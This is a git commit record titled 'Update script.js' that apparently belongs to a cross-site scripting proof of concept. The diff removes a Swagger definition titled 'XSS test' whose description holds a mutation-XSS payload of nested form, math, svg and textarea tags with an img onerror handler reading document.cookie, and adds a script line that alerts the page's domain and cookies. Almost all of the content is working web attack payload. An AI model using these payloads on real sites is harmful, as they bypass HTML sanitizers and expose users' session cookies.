00e4eb4dd733bd10963c4ccd7b765340ceecb80d
rfelecT <157028039+rfelecT@users.noreply.github.com>
2024-11-30 17:25:07 +0330

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,1 @@
-swagger: '2.0'
-info:
-  title: XSS test
-  description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+alert(document.domain + "\n" + document.cookie);
